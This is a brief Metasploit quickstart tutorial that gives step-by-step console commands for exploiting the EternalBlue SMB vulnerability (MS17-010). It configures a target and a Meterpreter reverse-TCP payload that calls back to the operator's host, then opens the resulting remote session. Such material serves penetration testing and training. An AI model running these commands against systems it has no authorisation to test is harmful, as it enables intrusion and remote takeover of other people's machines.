# Quickstart with Metasploit Framework:

1. **Download and install** Metasploit Framework from the [official Get Started page](https://www.metasploit.com/get-started) or via your package manager (e.g., `sudo apt install metasploit-framework` on Kali/Ubuntu).
2. **Initialize the database** by running `msfdb init` (or let the first console launch prompt you).
3. **Start the console** with `msfconsole`; wait for the `msf6 >` prompt.
4. **Verify connectivity** using `db_status` (should say “connected”) and pull the latest modules with `msfupdate`.
5. **Find an exploit**—for example, `search cve:2017-0144` or `search smb`.
6. **Load the module** you want (`use exploit/windows/smb/ms17_010_eternalblue`) and view required settings with `show options`.
7. **Configure the target & payload**:

   * `set RHOSTS <target-ip>`
   * `set LHOST <your-ip>`
   * `set PAYLOAD windows/x64/meterpreter/reverse_tcp` (or another suitable payload).
8. **Launch the attack** with `run` or `exploit`; once you obtain a Meterpreter session, list active sessions with `sessions -l` and interact using `sessions -i <id>`.

([metasploit.com][1], [kali.org][2], [kali.org][3], [github.com][4], [github.com][5])

[1]: https://www.metasploit.com/get-started "Getting Started with Metasploit for Penetration Testing"
[2]: https://www.kali.org/tools/metasploit-framework/ "metasploit-framework | Kali Linux Tools"
[3]: https://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/ "Metasploit Framework | Kali Linux Documentation"
[4]: https://github.com/rapid7/metasploit-framework/wiki/msfdb%3A-Database-Features-%26-How-to-Set-up-a-Database-for-Metasploit/2a66094517649eff8ca8819951d0e2659d9b57b2 "msfdb: Database Features & How to Set up a Database for Metasploit"
[5]: https://github.com/rapid7/metasploit-framework "rapid7/metasploit-framework - GitHub"
